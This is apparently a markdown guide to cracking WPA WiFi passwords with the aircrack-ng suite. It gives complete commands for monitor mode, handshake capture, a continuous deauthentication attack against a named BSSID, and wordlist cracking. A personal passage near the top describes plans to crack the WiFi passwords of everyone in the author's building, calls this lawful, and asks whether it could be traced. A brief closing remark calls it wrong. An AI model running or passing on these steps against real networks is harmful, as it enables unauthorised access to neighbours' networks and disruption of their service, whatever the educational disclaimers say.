# WiFi Password Cracking Guide

A comprehensive guide for educational WiFi security testing using Kali Linux tools.

---

## Prerequisites
- Kali Linux installation
- WiFi adapter with monitor mode support
- Root/sudo privileges
- **Note**: Only test on networks you own or have explicit permission to test

---


for the first time I learned how to hack into a wifi password it felt crazy though I am not that excited about it from inside but it felt like crazy to be able to do this its like power in hand great power with very few know how to use it cause once I can enter a wifi I don't know how much I can know about a person from sitting home  

at first I just wanted to know if it possible or not but now I guess it holds more power over anyone I can try to hack to everyone and anyone I can get wifi password of my whole building well that what I am thinking to do to try to copture wifi password of as many people as I can do cause I am not breaking law or anything I am just making them connect or try to connect to wifi for one time well I don't know how harmful it can be and can it trace me back to it or something like that cause I really do care and little bit I don't care cause that's what if I will do maybe someone will trace me back but what will they do for someone who just cracked everyone password for fun but can it be traced back cause i am not doing something that harmful i am just trying to stop their wifi for a second or maybe for some more time and meanwhile i just have to wait for someone to try to login back 

when David bombal is crazy god tier person well now i have to decide whom from should i start first someone who might be willing to sign in their wifi and let me capture the traffic 

well lets see 



## Step 1: Check Network Interfaces

View available network interfaces:

```bash
# Check network interfaces
ip addr

# View wireless interface details
iwconfig
```

---

## Step 2: Kill Conflicting Processes

Stop processes that might interfere with monitor mode:

```bash
sudo airmon-ng check kill
```

---

## Step 3: Enable Monitor Mode

Start monitor mode on your wireless interface:

```bash
# Start monitor mode (wlan0 is typically the wireless interface)
sudo airmon-ng start wlan0
```

---

## Step 4: Verify Monitor Mode

Confirm monitor mode is active:

```bash
# Check airmon-ng status
sudo airmon-ng

# Alternative: verify with iwconfig
iwconfig
```

You should see `wlan0mon` interface in **Mode: Monitor**

---

## Step 5: Scan for Target Access Point

Discover nearby access points and their details:

```bash
sudo airodump-ng wlan0mon
```

**Note the following from your target AP:**
- **BSSID** (MAC address): `90:9A:4A:B8:F3:FB`
- **Channel**: `2`
- **ESSID** (network name)

Press `Ctrl+C` to stop scanning once you've identified your target.

---

## Step 6: Capture Handshake (Terminal Window 1)

Start capturing packets from the target AP:

```bash
# Replace values with your target AP details:
# -w hack1          : output file name
# -c 2              : channel number
# --bssid XX:XX:... : target AP MAC address

sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
```

**Leave this terminal running** - it will capture the WPA handshake.

---

## Step 7: Deauthentication Attack (Terminal Window 2)

In a **new terminal window**, force clients to reconnect (capturing the handshake):

```bash
# Deauthentication attack
# --deauth 0        : continuous deauth packets (use a number like 10 for limited packets)
# -a                : target AP BSSID

sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```

**Watch Terminal 1** for `WPA handshake: XX:XX:XX:XX:XX:XX` message in the top-right corner.

Once captured, press `Ctrl+C` in both terminals.

---

## Step 8: Analyze Capture with Wireshark (Optional)

Verify the handshake capture:

```bash
# Open capture file in Wireshark
wireshark hack1-01.cap
```

**Filter for EAPOL packets:**
```
eapol
```

You should see 4-way handshake packets (EAPOL key frames).

---

## Step 9: Stop Monitor Mode

Return interface to managed mode:

```bash
sudo airmon-ng stop wlan0mon
```

---

## Step 10: Crack the Password

Use aircrack-ng with a wordlist to crack the password:

```bash
# Prepare rockyou wordlist (if needed)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack the password
# Replace hack1-01.cap with your capture file name
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```

**Alternative wordlists:**
- `/usr/share/wordlists/rockyou.txt` (most common)
- Custom wordlists
- Generated wordlists using `crunch` or `john`

---

## Success Indicators

If successful, you'll see output similar to:
```
KEY FOUND! [ password123 ]
```

---

**Created for educational purposes only. Always follow ethical hacking guidelines and obtain proper authorization.**


perfect technique to breach wifi password but this is not just correct it is wrong and should not be done whatsoever 
ya trying stuff on your own wifi is fine but u cant just breach someone wifi password for what its not worth it.

